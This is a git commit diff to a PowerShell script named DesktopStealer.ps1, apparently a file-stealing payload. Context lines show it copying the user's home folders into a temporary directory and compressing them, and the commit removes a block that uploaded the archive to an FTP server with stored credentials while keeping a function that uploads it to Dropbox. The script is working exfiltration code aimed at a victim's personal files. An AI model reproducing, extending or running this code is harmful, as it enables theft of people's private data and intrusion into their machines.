f4a950c9069f8862b8df8bba5340edc21795380a
GSL82 <167813786+GSL82@users.noreply.github.com>
2024-04-26 10:01:53 -0400

    Update DesktopStealer.ps1

--- DesktopStealer.ps1
+++ DesktopStealer.ps1
@@ -42,28 +42,6 @@ copy-item -path "$home\Music\*" -destination "$env:TMP\$FolderName\" -recurse
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
-# Upload to FTP
-
-# create the FtpWebRequest and configure it
-$ftp = [System.Net.FtpWebRequest]::Create($FTPURL)
-$ftp = [System.Net.FtpWebRequest]$ftp
-$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-$ftp.Credentials = new-object System.Net.NetworkCredential($PASS,$USER)
-$ftp.UseBinary = $true
-$ftp.UsePassive = $true
-# read in the file to upload as a byte array
-$content = [System.IO.File]::ReadAllBytes($env:tmp/$ZIP)
-$ftp.ContentLength = $content.Length
-# get the request stream, and write the bytes into it
-$rs = $ftp.GetRequestStream()
-$rs.Write($content, 0, $content.Length)
-# be sure to clean up after ourselves
-$rs.Close()
-$rs.Dispose()
-
-
-###############################################################################################################################################
-
 # Upload output file to dropbox
 
 function dropbox {
